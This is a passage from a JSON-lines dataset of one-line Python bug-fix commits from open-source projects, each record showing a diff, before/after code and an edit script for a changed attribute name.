= 'Best run at %i of %i (best like=%g) with parameter set:' % ( self . status . bestrep , self . status . repetitions , self . status . objectivefunction )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:rep\", 3, 25, 3, 28], \"bestrep\"]]"}
{"project": "spotpy", "commit_sha": "925706989d519b795408e8597580444e55bd9448", "parent_sha": "dfbb6f98bad92c3efaf38c4f86dec32ec4242843", "file_path": "spotpy/algorithms/_algorithm.py", "project_url": "https://github.com/zutn/spotpy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -181,7 +181,7 @@ class _algorithm(object):\n             pass\n         print('End of sampling')\n         text = 'Best run at %i of %i (best like=%g) with parameter set:' % (\n-            self.status.rep, self.status.repetitions, self.status.objectivefunction)\n+            self.status.bestrep, self.status.repetitions, self.status.objectivefunction)\n         print(text)\n         print(self.status.params)\n         text = 'Duration:' + str(round((time.time() - self.status.starttime), 2)) + ' s'\n", "before": "text = 'Best run at %i of %i (best like=%g) with parameter set:' % ( self . status . rep , self . status . repetitions , self . status . objectivefunction )", "after": "text = 'Best run at %i of %i (best like=%g) with parameter set:' % ( self . status . bestrep , self . status . repetitions , self . status . objectivefunction )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:rep\", 3, 25, 3, 28], \"bestrep\"]]"}
{"project": "kitsune", "commit_sha": "f38f3caf653e4b4d3e2d3eb7c566c27cb71f19c3", "parent_sha": "ba5ec5aee153c4775fb7882b4661af26d33e38a1", "file_path": "apps/notifications/tasks.py", "project_url": "https://github.com/skcrouch7/kitsune", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -16,8 +16,8 @@ def send_notification(content_type, pk, subject, content, exclude=None):\n \n     log.info(\"Got notification for %s: %s\" % (content_type, pk))\n \n-    watchers = EventWatch.objects.filter(content_type=content_type,\n-                                         watch_id=pk)\n+    watchers = EventWatch.uncached.filter(content_type=content_type,\n+                                          watch_id=pk)\n     if exclude:\n         watchers = watchers.exclude(email__in=exclude)\n \n", "before": "watchers = EventWatch . objects . filter ( content_type = content_type , watch_id = pk )", "after": "watchers = EventWatch . uncached . filter ( content_type = content_type , watch_id = pk )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:objects\", 3, 27, 3, 34], \"uncached\"]]"}
{"project": "pyroboime", "commit_sha": "0b701d11b8c4b897156d9b45f3731f4e3ed82584", "parent_sha": "b9a2d060bccbf91dc2a9b8e5f88bb07962a98ce0", "file_path": "roboime/base.py", "project_url": "https://github.com/KN2C/pyroboime", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -121,7 +121,7 @@ class Action(object):\n \n     @property\n     def absolute_speeds(self):\n-        vx, vy, va = self._speeds\n+        vx, vy, va = self.speeds\n         ra = self.robot.angle\n         return (vx * cos(ra) - vy * sin(ra), vy * cos(ra) + vx * sin(ra), va)\n \n", "before": "vx , vy , va = self . _speeds", "after": "vx , vy , va = self . speeds", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:_speeds\", 3, 27, 3, 34], \"speeds\"]]"}
{"project": "Pentaho-Odoo", "commit_sha": "ad634f8dbe9ea2399610f844a07f8c0d68f755ab", "parent_sha": "8b84f2d45d6c699afe6c5fb50eed5ee88dfaed42", "file_path": "openerp_addon/pentaho_reports/ui.py", "project_url": "https://github.com/WilldooIT/Pentaho-Odoo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -176,7 +176,7 @@ class report_xml(osv.osv):\n \n             values_ids = values_obj.search(cr, uid, [(\"value\", \"=\", \"ir.actions.report.xml,%s\" % report.id)])\n \n-            if report.pentaho_filename or report.pantaho_file:\n+            if report.pentaho_filename or report.pentaho_file:\n                 path = self.save_content_to_file(report.pentaho_filename, report.pentaho_file)\n \n                 super(report_xml, self).write(cr, uid, [report.id], {\"report_rml\": path})\n", "before": "if report . pentaho_filename or report . pantaho_file : path = self . save_content_to_file ( report . pentaho_filename , report . pentaho_file ) super ( report_xml , self ) . write ( cr , uid , [ report . id ] , { \"report_rml\" : path } )", "after": "if report . pentaho_filename or report . pentaho_file : path = self . save_content_to_file ( report . pentaho_filename , report . pentaho_file ) super ( report_xml , self ) . write ( cr , uid , [ report . id ] , { \"report_rml\" : path } )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:pantaho_file\", 3, 50, 3, 62], \"pentaho_file\"]]"}
{"project": "Pentaho-Odoo", "commit_sha": "5f0a34341b4fff15c63053e70d6781398e1c0a37", "parent_sha": "9c59271b5fad6722106e3a10988315cd7626ae66", "file_path": "openerp_addon/pentaho_report_selection_sets/report_selections.py", "project_url": "https://github.com/WilldooIT/Pentaho-Odoo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -152,7 +152,7 @@ class report_prompt_with_selection_set(orm.TransientModel):\n             # This may be only be needed for a short time...\n             # A change (bug?) in the new API falls over on first install because the column is not yet a field and it tries to put a default value in the physical DB column.\n             # An explicit default gets around things.\n-            self._default[field_name] = ''\n+            self._defaults[field_name] = ''\n \n     def default_get(self, cr, uid, fields, context=None):\n         if context is None:\n", "before": "self . _default [ field_name ] = ''", "after": "self . _defaults [ field_name ] = ''", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:_default\", 3, 18, 3, 26], \"_defaults\"]]"}
{"project": "semstr", "commit_sha": "25b6cd0a91efe892e14e7f9a7ea6d0a1526ddacc", "parent_sha": "08faeacb5ced9b443c4c1b0ec0e9aeccf87c018f", "file_path": "semstr/evaluation/conllu.py", "project_url": "https://github.com/huji-nlp/semstr", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -35,7 +35,7 @@ def get_scores(s1, s2, eval_type, verbose=False, units=False):\n \n \n def join_tokens(dep_nodes):\n-    return \"\".join((n.parent_multi_word.token.text if n.position == n.parent_multi_word.position[0] else \"\")\n+    return \"\".join((n.parent_multi_word.token.text if n.position == n.parent_multi_word.span[0] else \"\")\n                    if n.parent_multi_word else n.token.text for nodes, _ in dep_nodes for n in nodes[1:])\n \n \n", "before": "return \"\" . join ( ( n . parent_multi_word . token . text if n . position == n . parent_multi_word . position [ 0 ] else \"\" ) if n . parent_multi_word else n . token . text for nodes , _ in dep_nodes for n in nodes [ 1 : ] )", "after": "return \"\" . join ( ( n . parent_multi_word . token . text if n . position == n . parent_multi_word . span [ 0 ] else \"\" ) if n . parent_multi_word else n . token . text for nodes , _ in dep_nodes for n in nodes [ 1 : ] )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:position\", 3, 89, 3, 97], \"span\"]]"}
{"project": "reverse", "commit_sha": "23a655f66dd90f48f980ee7ce81205e489629060", "parent_sha": "b3b81f42804bbd81d5375878e4b9c367ed8b7c55", "file_path": "test_reverse.py", "project_url": "https://github.com/d4nnyk/reverse", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -26,7 +26,7 @@ def reverse_file(filename, symbol):\n     lib.ast.local_vars_size = []\n     lib.ast.local_vars_name = []\n     lib.ast.vars_counter = 1\n-    lib.ast.cmp_fused = set()\n+    lib.ast.all_fused_inst = set()\n     sio = StringIO()\n     params = ['--nosectionsname', '--nocolor', filename]\n     if symbol is not None:\n", "before": "lib . ast . cmp_fused = set ( )", "after": "lib . ast . all_fused_inst = set ( )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:cmp_fused\", 3, 13, 3, 22], \"all_fused_inst\"]]"}
{"project": "reverse", "commit_sha": "3b7120c3d2df0b7321966431789cd5ea8d64761f", "parent_sha": "07bae58260e3d320888c0802d375256aedc7f649", "file_path": "reverse/lib/analyzer.py", "project_url": "https://github.com/d4nnyk/reverse", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -96,7 +96,7 @@ class Analyzer(threading.Thread):\n \n \n     def __add_prefetch(self, addr_set, inst):\n-        if self.is_arm:\n+        if self.is_mips:\n             prefetch = self.dis.lazy_disasm(inst.address + inst.size)\n             addr_set[prefetch.address] = prefetch\n             return prefetch\n", "before": "if self . is_arm : prefetch = self . dis . lazy_disasm ( inst . address + inst . size ) addr_set [ prefetch . address ] = prefetch return prefetch", "after": "if self . is_mips : prefetch = self . dis . lazy_disasm ( inst . address + inst . size ) addr_set [ prefetch . address ] = prefetch return prefetch", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:is_arm\", 3, 17, 3, 23], \"is_mips\"]]"}
{"project": "salt", "commit_sha": "592de1d93cb361315e3955bcc7087452d95e8d18", "parent_sha": "7b87f0d6b01361df70f0906aaf879eb7913e412d", "file_path": "salt/modules/influx.py", "project_url": "https://github.com/kraney/salt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -491,7 +491,7 @@ def login_test(name, password, database=None, host=None, port=None):\n         client.get_list_database()\n         return True\n     except InfluxDBClientError as e:\n-        if e.status_code == 401:\n+        if e.code == 401:\n             return False\n         else:\n             raise\n", "before": "InfluxDBClientError as e : if e . status_code == 401 : return False", "after": "InfluxDBClientError as e : if e . code == 401 : return False", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:status_code\", 3, 14, 3, 25], \"code\"]]"}
{"project": "amepah", "commit_sha": "73acea5ccfc4668e97b1b24d0af8dd33e7e4c1e5", "parent_sha": "476e1d9c741620233675326251f9b1662f0461a6", "file_path": "calibrate_zodi_time.py", "project_url": "https://github.com/berkelem/amepah", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -60,7 +60,7 @@ class Coadder:\n         # self.gains_adj = gains\n         # self.offsets_adj = offsets\n         gains = self.gains\n-        offsets = self.offets\n+        offsets = self.offsets\n         for j in range(num_orbits):\n             print(f\"Adding orbit {j}\")\n             self.add_file(j, gains[j], offsets[j])\n", "before": "offsets = self . offets", "after": "offsets = self . offsets", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:offets\", 3, 24, 3, 30], \"offsets\"]]"}
{"project": "amepah", "commit_sha": "b82c32e64a9ffabde3fc55d634c4b48242fbabe9", "parent_sha": "96c9cf25b8497f05ec69b8819fedb2baf8bcc3f5", "file_path": "calibrate_zodi_time.py", "project_url": "https://github.com/berkelem/amepah", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -200,7 +200,7 @@ class Coadder:\n     def add_orbit(self, orbit):\n \n         if len(orbit.orbit_uncs[orbit.orbit_uncs!=0.0]) > 0 and orbit.gain!=0.0:\n-            print(orbit.pixel_inds.shape, orbit.zs_data.hape, orbit.cal_uncs.shape)\n+            print(orbit.pixel_inds.shape, orbit.zs_data.shape, orbit.cal_uncs.shape)\n             self.numerator[orbit.pixel_inds] += np.divide(orbit.zs_data, np.square(orbit.cal_uncs), where=orbit.cal_uncs != 0.0, out=np.zeros_like(orbit.cal_uncs))\n             self.denominator[orbit.pixel_inds] += np.divide(1, np.square(orbit.cal_uncs), where=orbit.cal_uncs != 0.0, out=np.zeros_like(orbit.cal_uncs))\n         return\n", "before": "print ( orbit . pixel_inds . shape , orbit . zs_data . hape , orbit . cal_uncs . shape )", "after": "print ( orbit . pixel_inds . shape , orbit . zs_data . shape , orbit . cal_uncs . shape )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:hape\", 3, 57, 3, 61], \"shape\"]]"}
{"project": "amepah", "commit_sha": "b9d80204f2ec0c7a119a55ae289384205ec84f04", "parent_sha": "b036a9cbb986fd9c49052a9dc1846ed2a835a3a6", "file_path": "calibrate_zodi_time.py", "project_url": "https://github.com/berkelem/amepah", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -93,7 +93,7 @@ class Orbit:\n     def clean_data(self):\n         z = np.abs(stats.zscore(self.zs_data))\n         mask = z > 1\n-        inds_to_mask = self.pixel_inds_masked[mask]\n+        inds_to_mask = self.pixel_inds[mask]\n         self.mask_inds = np.append(self.mask_inds, inds_to_mask)\n         self.apply_mask()\n         return\n", "before": "inds_to_mask = self . pixel_inds_masked [ mask ]", "after": "inds_to_mask = self . pixel_inds [ mask ]", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:pixel_inds_masked\", 3, 29, 3, 46], \"pixel_inds\"]]"}
{"project": "amepah", "commit_sha": "97fd6d45855f33fe3868f7a1eed9cf022a498aa8", "parent_sha": "ab742d2d8dedb7a83c655d077e903b3d871fa8cf", "file_path": "orbit_calibration_2_fullsky_map/coadd_orbits.py", "project_url": "https://github.com/berkelem/amepah", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -528,7 +528,7 @@ class Coadder:\n                 if month == \"all\":\n                     pass\n                 else:\n-                    if not self._filter_timestamps(month, orbit.mean_mjd_obs):\n+                    if not self._filter_timestamps(month, orbit._mean_mjd_obs):\n                         print(f\"Skipping orbit {i}\")\n                         continue\n \n", "before": "if not self . _filter_timestamps ( month , orbit . mean_mjd_obs ) : print ( f\"Skipping orbit {i}\" ) continue", "after": "if not self . _filter_timestamps ( month , orbit . _mean_mjd_obs ) : print ( f\"Skipping orbit {i}\" ) continue", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:mean_mjd_obs\", 3, 65, 3, 77], \"_mean_mjd_obs\"]]"}
{"project": "pritunl", "commit_sha": "f7f9ac206af2be532adaa616ddd8d977153bcaf2", "parent_sha": "805e280f7a9694c3a12cb32be64efcc15a80615a", "file_path": "pritunl/app.py", "project_url": "https://github.com/tomzhang/pritunl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -66,7 +66,7 @@ def _run_wsgi_debug():\n \n     # App.run server uses werkzeug logger\n     werkzeug_logger = logging.getLogger('werkzeug')\n-    werkzeug_logger.setLevel(logging.DEBUG)\n+    werkzeug_logger.setLevel(logging.WARNING)\n     werkzeug_logger.addFilter(logger.log_filter)\n     werkzeug_logger.addHandler(logger.log_handler)\n \n", "before": "werkzeug_logger . setLevel ( logging . DEBUG )", "after": "werkzeug_logger . setLevel ( logging . WARNING )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:DEBUG\", 3, 38, 3, 43], \"WARNING\"]]"}
{"project": "pritunl", "commit_sha": "afa34eabfeab28468e99d8450e83b3086d81acc0", "parent_sha": "8c1fceab5176ff4d75ff66f69b42473eadd4935b", "file_path": "pritunl/queue_dh_param.py", "project_url": "https://github.com/tomzhang/pritunl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -67,7 +67,7 @@ class QueueDhParam(Queue):\n             if response['updatedExisting']:\n                 return\n \n-        self.collection.insert({\n+        self.dh_params_collection.insert({\n             'dh_param_bits': self.dh_param_bits,\n             'dh_params': self.dh_params,\n         })\n", "before": "self . collection . insert ( { 'dh_param_bits' : self . dh_param_bits , 'dh_params' : self . dh_params , } )", "after": "self . dh_params_collection . insert ( { 'dh_param_bits' : self . dh_param_bits , 'dh_params' : self . dh_params , } )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:collection\", 3, 14, 3, 24], \"dh_params_collection\"]]"}
{"project": "pritunl", "commit_sha": "945820223f671152eaf98f289ab8619c6be30a2c", "parent_sha": "e468a222b0a4988b38c01d5596d876722f69bb8c", "file_path": "pritunl/log_entry.py", "project_url": "https://github.com/tomzhang/pritunl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -25,7 +25,7 @@ class LogEntry(MongoObject):\n     def dict(self):\n         return {\n             'id': self.id,\n-            'timestamp': self.time.strftime('%s'),\n+            'timestamp': self.timestamp.strftime('%s'),\n             'message': self.message,\n         }\n \n", "before": "return { 'id' : self . id , 'timestamp' : self . time . strftime ( '%s' ) , 'message' : self . message , }", "after": "return { 'id' : self . id , 'timestamp' : self . timestamp . strftime ( '%s' ) , 'message' : self . message , }", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:time\", 3, 31, 3, 35], \"timestamp\"]]"}
{"project": "pritunl", "commit_sha": "d764386d5882460d93ca2349fbf021aa07eb39e2", "parent_sha": "a6a1516d9f9df6080a3ad70403f56d542580be4b", "file_path": "pritunl/messenger.py", "project_url": "https://github.com/tomzhang/pritunl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -36,7 +36,7 @@ class Messenger:\n                 if cursor_id:\n                     spec['_id'] = {'$gt': cursor_id}\n                 cursor = self.collection.find(spec, tailable=True,\n-                    await_data=True).sort('$natural', pymongo.DESCENDING)\n+                    await_data=True).sort('$natural', pymongo.ASCENDING)\n                 while cursor.alive:\n                     for doc in cursor:\n                         cursor_id = doc['_id']\n", "before": "cursor = self . collection . find ( spec , tailable = True , await_data = True ) . sort ( '$natural' , pymongo . DESCENDING )", "after": "cursor = self . collection . find ( spec , tailable = True , await_data = True ) . sort ( '$natural' , pymongo . ASCENDING )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:DESCENDING\", 3, 63, 3, 73], \"ASCENDING\"]]"}
{"project": "lektor", "commit_sha": "67c7d04f35d1a55bfe20e6f5fb47a40d57c3d4b1", "parent_sha": "7014298b14ea69056d95e9d190032df0a8a1b04a", "file_path": "lektor/pluginsystem.py", "project_url": "https://github.com/lektor/lektor", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -94,7 +94,7 @@ class Plugin(object):\n         return cfg\n \n     def emit(self, event, **kwargs):\n-        return self.env.pluginsystem.emit(self.id + \"-\" + event, **kwargs)\n+        return self.env.plugin_controller.emit(self.id + \"-\" + event, **kwargs)\n \n     def to_json(self):\n         return {\n", "before": "return self . env . pluginsystem . emit ( self . id + \"-\" + event , ** kwargs )", "after": "return self . env . plugin_controller . emit ( self . id + \"-\" + event , ** kwargs )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:pluginsystem\", 3, 25, 3, 37], \"plugin_controller\"]]"}
{"project": "dm_control", "commit_sha": "a3aa5b50b10ce230e7406513fcaeead60d0d135a", "parent_sha": "4008fd959712e8761381d7b224c1fb583290df7e", "file_path": "dm_control/composer/entity.py", "project_url": "https://github.com/deepmind/dm_control", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -333,7 +333,7 @@ class Entity(object):\n \n   @property\n   def attachment_site(self):\n-    return self._mjcf_root\n+    return self.mjcf_model\n \n   def get_pose(self, physics):\n", "before": "return self . _mjcf_root", "after": "return self . mjcf_model", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:_mjcf_root\", 3, 17, 3, 27], \"mjcf_model\"]]"}
{"project": "httpie", "commit_sha": "70b36580044c7eb0231fbfa8464c283cd461dc14", "parent_sha": "3d11042772fe7f75008e53dc48c537fc4bbd0b1a", "file_path": "httpie/httpmessage.py", "project_url": "https://github.com/phagan94/httpie", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -25,7 +25,7 @@ def from_request(request):\n         headers='\\n'.join(str('%s: %s') % (name, value)\n                           for name, value\n                           in request_headers.items()),\n-        body=request._enc_data,\n+        body=request.data,\n         content_type=request_headers.get('Content-Type')\n     )\n \n", "before": "body = request . _enc_data , content_type = request_headers . get ( 'Content-Type' )", "after": "body = request . data , content_type = request_headers . get ( 'Content-Type' )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:_enc_data\", 3, 22, 3, 31], \"data\"]]"}
{"project": "f5-openstack-agent", "commit_sha": "831d83df5498b316fe635e92c7f7714be455a5a7", "parent_sha": "6e65c82e01115ffc5cf15059f84e8de65528f76c", "file_path": "f5_openstack_agent/lbaasv2/drivers/bigip/lbaas_builder.py", "project_url": "https://github.com/mercadolibre/f5-openstack-agent", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -409,7 +409,7 @@ class LBaaSBuilder(object):\n         for l7policy in l7policies:\n             if l7policy['provisioning_status'] == plugin_const.PENDING_CREATE \\\n                     or l7policy['provisioning_status'] == \\\n-                    plugin_const.PENDING_CREATE:\n+                    plugin_const.PENDING_UPDATE:\n                 try:\n                     self.l7service.create_l7policy(l7policy, service, bigips)\n                 except Exception as err:\n", "before": "if l7policy [ 'provisioning_status' ] == plugin_const . PENDING_CREATE or l7policy [ 'provisioning_status' ] == plugin_const . PENDING_CREATE : try : self . l7service . create_l7policy ( l7policy , service , bigips ) except Exception as err : ", "after": "if l7policy [ 'provisioning_status' ] == plugin_const . PENDING_CREATE or l7policy [ 'provisioning_status' ] == plugin_const . PENDING_UPDATE : try : self . l7service . create_l7policy ( l7policy , service , bigips ) except Exception as err : ", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:PENDING_CREATE\", 3, 34, 3, 48], \"PENDING_UPDATE\"]]"}
{"project": "tangerine", "commit_sha": "7beb790066093cf61a8152fea104f40764d11c9d", "parent_sha": "26bff48059d224212a46a9267b49fcac5b87a728", "file_path": "tangerine/models.py", "project_url": "https://github.com/shacker/tangerine", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -322,7 +322,7 @@ def get_author_avatar_upload_dir(instance, filename):\n     \"\"\"Determine upload dir for author avatar image files.\n     \"\"\"\n \n-    return '/'.join(['authors', instance.author.username, filename])\n+    return '/'.join(['authors', instance.user.username, filename])\n \n \n class AuthorPage(TimeStampedModel):\n", "before": "return '/' . join ( [ 'authors' , instance . author . username , filename ] )", "after": "return '/' . join ( [ 'authors' , instance . user . username , filename ] )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:author\", 3, 42, 3, 48], \"user\"]]"}
{"project": "rtmpsnoop", "commit_sha": "3724102f28527dc924ce2355e13cf497ffe827e5", "parent_sha": "2eab9086c0c11d18ad60ba168b1ab22ce9f0666f", "file_path": "lib/Logger.py", "project_url": "https://github.com/OpenLD/rtmpsnoop", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -29,7 +29,7 @@ class Logger():\n \n     def debug(self, message):\n         if self.DEBUG and not self.QUIET:\n-            print >> sys.stder, \"# %s\" % message\n+            print >> sys.stderr, \"# %s\" % message\n \n     def error(self, message):\n         print >> sys.stderr, \"*** %s\" % message\n", "before": "print >> sys . stder , \"# %s\" % message", "after": "print >> sys . stderr , \"# %s\" % message", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:stder\", 3, 26, 3, 31], \"stderr\"]]"}
{"project": "spyne", "commit_sha": "08b51f550af9f7671c1618b280377b361bae7977", "parent_sha": "28dca53440fcf5e407c4b6fc477f8dbb29302127", "file_path": "spyne/test/model/test_complex.py", "project_url": "https://github.com/duixteam/spyne", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -353,7 +353,7 @@ class TestXmlAttribute(unittest.TestCase):\n \n         self.assertIsNotNone(attribute_def)\n         self.assertEqual(attribute_def.get('name'), 'a')\n-        self.assertEqual(attribute_def.get('type'), CM.a._typ.get_type_name_ns(interface))\n+        self.assertEqual(attribute_def.get('type'), CM.a.type.get_type_name_ns(interface))\n \n \n class TestSimpleTypeRestrictions(unittest.TestCase):\n", "before": "self . assertEqual ( attribute_def . get ( 'type' ) , CM . a . _typ . get_type_name_ns ( interface ) )", "after": "self . assertEqual ( attribute_def . get ( 'type' ) , CM . a . type . get_type_name_ns ( interface ) )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:_typ\", 3, 58, 3, 62], \"type\"]]"}
{"project": "spyne", "commit_sha": "12b8502ba25d68df5ee3bebca0d7736a5fb35ea7", "parent_sha": "0a58aa00f59d1a9bd2c78b68df4ccf9ae531b40c", "file_path": "spyne/protocol/xml/model.py", "project_url": "https://github.com/duixteam/spyne", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -237,7 +237,7 @@ def complex_from_element(prot, cls, element):\n         if member is None:\n             continue\n \n-        value = member._typ.from_string(element.attrib[key])\n+        value = member.type.from_string(element.attrib[key])\n \n         setattr(inst, key, value)\n \n", "before": "value = member . _typ . from_string ( element . attrib [ key ] )", "after": "value = member . type . from_string ( element . attrib [ key ] )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:_typ\", 3, 24, 3, 28], \"type\"]]"}
{"project": "openobject-client-6.0", "commit_sha": "2f9eb0387a7fe32b7006a02cf181871dd2a9aa58", "parent_sha": "bbc410ee7a0c7ce80ca7253eae7ffe11dcdf51b4", "file_path": "bin/widget/view/form_gtk/url.py", "project_url": "https://github.com/hunslater/openobject-client-6.0", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -44,7 +44,7 @@ class url(interface.widget_interface):\n \t\tself.entry.set_max_length(int(attrs.get('size',16)))\n \t\tself.entry.set_visibility(not attrs.get('invisible', False))\n \t\tself.entry.set_width_chars(5)\n-\t\tself.entre.set_property('activates_default', True)\n+\t\tself.entry.set_property('activates_default', True)\n \t\tself.entry.connect('activate', self.sig_activate)\n \t\tself.entry.connect('focus-in-event', lambda x,y: self._focus_in())\n \t\tself.entry.connect('focus-out-event', lambda x,y: self._focus_out())\n", "before": "self . entre . set_property ( 'activates_default' , True )", "after": "self . entry . set_property ( 'activates_default' , True )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:entre\", 3, 8, 3, 13], \"entry\"]]"}
{"project": "openobject-client-6.0", "commit_sha": "d5c60938b6ba86db8a2c83430263de431e0221bf", "parent_sha": "60a3e897ae8b7bc9b4b043829d71ab1967c14973", "file_path": "bin/modules/gui/window/tree.py", "project_url": "https://github.com/hunslater/openobject-client-6.0", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -266,7 +266,7 @@ class tree(object):\n \n \tdef sc_btn(self, widget):\n \t\tmain = service.LocalService('gui.main')\n-\t\tmain.shortcut_edit(widget, self.domain)\n+\t\tmain.shortcut_edit(widget, self.model)\n \n \tdef sc_del(self, widget):\n \t\tid = self.tree_sc.sel_id_get()\n", "before": "main . shortcut_edit ( widget , self . domain )", "after": "main . shortcut_edit ( widget , self . model )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:domain\", 3, 35, 3, 41], \"model\"]]"}
{"project": "openobject-client-6.0", "commit_sha": "b12767c0a80eaccf73bd0093d9f7a500fceeab71", "parent_sha": "dac3f47990011df029d7ec50abc12e403f977caf", "file_path": "bin/widget/view/form_gtk/binary.py", "project_url": "https://github.com/hunslater/openobject-client-6.0", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -101,7 +101,7 @@ class wid_binary(interface.widget_interface):\n \n \tdef display(self, model, model_field):\n \t\tif not model_field:\n-\t\t\tself.widget.set_text('')\n+\t\t\tself.wid_text.set_text('')\n \t\t\treturn False\n \t\tsuper(wid_binary, self).display(model, model_field)\n \t\tself.model_field = model_field\n", "before": "self . widget . set_text ( '' )", "after": "self . wid_text . set_text ( '' )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:widget\", 3, 9, 3, 15], \"wid_text\"]]"}
{"project": "EventClassificationDNN", "commit_sha": "ba16d3ef43126d763f074f90497501fa9ffb6311", "parent_sha": "c7ab056b1f582074251d0c6a8a0a6838ff44486a", "file_path": "CSVWriter.py", "project_url": "https://github.com/UTA-HEP-Computing/EventClassificationDNN", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -19,7 +19,7 @@ def CSVWriter(filename,X,Y,R):\n     f = open(filename, 'w')\n     f.write(colnames[:-1]+\"\\n\")\n \n-    X0=X.view(np.float).reshape(X.shape + (-1,))\n+    X0=X.view(np.float32).reshape(X.shape + (-1,))\n \n     YI=np.nonzero(Y)[1]\n     out=np.concatenate((X0,Y,R),axis=1)\n", "before": "X0 = X . view ( np . float ) . reshape ( X . shape + ( - 1 , ) )", "after": "X0 = X . view ( np . float32 ) . reshape ( X . shape + ( - 1 , ) )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:float\", 3, 18, 3, 23], \"float32\"]]"}
{"project": "scikit-learn", "commit_sha": "4a3c44ebb8c830ad69cde7682fd1760c30e47acd", "parent_sha": "6b91f6dbdbe989d285e4bdcc8dcacdc05ceff192", "file_path": "sklearn/kernel_approximation.py", "project_url": "https://github.com/t-lanigan/scikit-learn", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -252,7 +252,7 @@ class AdditiveChi2Sampler(BaseEstimator, TransformerMixin):\n                 raise ValueError(\"If sample_steps is not in [1, 2, 3],\"\n                                  \" you need to provide sample_interval\")\n         else:\n-            self.sample_interval_ = self.interval\n+            self.sample_interval_ = self.sample_interval\n         return self\n \n     def transform(self, X, y=None):\n", "before": "else : self . sample_interval_ = self . interval", "after": "else : self . sample_interval_ = self . sample_interval", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:interval\", 3, 42, 3, 50], \"sample_interval\"]]"}
